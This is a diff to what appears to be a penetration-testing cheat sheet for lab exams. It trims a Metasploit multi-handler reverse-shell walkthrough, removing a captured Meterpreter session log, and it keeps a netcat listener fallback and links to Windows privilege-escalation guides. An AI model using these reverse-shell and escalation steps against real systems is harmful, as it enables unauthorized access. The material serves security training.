@@ -100,34 +100,16 @@ Using the public exploit you found + Metasploit Multi-Handler, you can establish
 
 Metasploit Handler usage w/ public exploit:
 ```bash
-# Set up Metasploit Handler (use multi-handler -> set reverse shell payload -> set variables -> run handler)
+# SETUP HANDLER
 $ msfconsole
 $ msf > use exploit/multi/handler
 $ msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
-$ msf exploit(handler) > set EXITFUNC thread
-$ msf exploit(handler) > set LHOST 10.11.0.31
-$ msf exploit(handler) > set LPORT 443
-$ msf exploit(handler) > run
-[*] Exploit running as background job 0.
-[*] Started reverse TCP handler on 10.11.0.31:443 
-
-# Execute Public Exploit:
-$ python exploit.py [ target_ip ]
-
-# Metasploit Handler (meterpreter session -> background the session -> connect back to session)
-[*] Exploit running as background job 0.
-[*] Started reverse TCP handler on 10.11.0.31:443 
-[*] Sending stage (179267 bytes) to 10.11.1.5
-[*] Meterpreter session 0 opened (10.11.0.31:443 -> 10.11.1.5:1199) at 2019-01-07 22:46:33 +1100
-meterpreter > help
 . . . 
-meterpreter > background
-msf exploit(ms08_067_netapi) > sessions -i 0
-[*] Starting interaction with 0...
-meterpreter >
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 10.11.0.31:443 
 ```
 
-Meterpreter sometimes doesn't work.  
+Meterpreter sometimes doesn't work.
 Go back to using `nc -nvlp 80` and trigger reverse shell in vulnerable app/service.
 
 
@@ -151,6 +133,7 @@ Linux privesc:
 Windows privesc:
 * Automated scanner: https://github.com/azmatt/windowsEnum
 * http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet/
+* http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
 * https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md
 * Accesschk.exe: http://www.fuzzysecurity.com/tutorials/16.html
 
@@ -201,10 +184,6 @@ net start <vulnerable-service>
 ```
 
 Summarise possible attack vectors / vulnerable services to escalate privileges.
-
-### PRIVILEGE ESCALATION - FINDING EXPLOIT
-
-Use information gathered from enumeration stage to find an exploit for vectors / vulnerable services in your list.
 
 
 
